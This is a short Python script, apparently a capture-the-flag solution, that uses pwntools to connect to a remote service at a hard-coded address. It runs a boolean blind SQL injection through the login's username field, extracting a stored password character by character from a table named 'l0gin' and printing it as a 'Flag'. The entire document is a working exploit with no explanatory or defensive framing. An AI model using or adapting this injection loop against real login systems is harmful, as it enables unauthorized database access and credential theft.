from pwn import *
r = remote('172.104.189.82', 27596)
 
 
def login(username, password = ''):
    r.sendline('1')
    r.recvuntil('Username:')
    r.sendline(username)
    r.recvuntil('Password:')
    r.sendline(password)
    if 'successful' in r.recvuntil('What is your choice:'):
        return True
    else:
        return False
 
charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890{}_'
pattern = "' AND (SELECT ASCII(SUBSTRING(password,{},1)) FROM l0gin LIMIT 1,1)={}#"
result = ''
for index in range(1, 28):
    for character in charSet:
        payload = pattern.format(index, ord(character))
        check = login(payload)
        if check:
            result += character
            print "Flag: " + result
            break
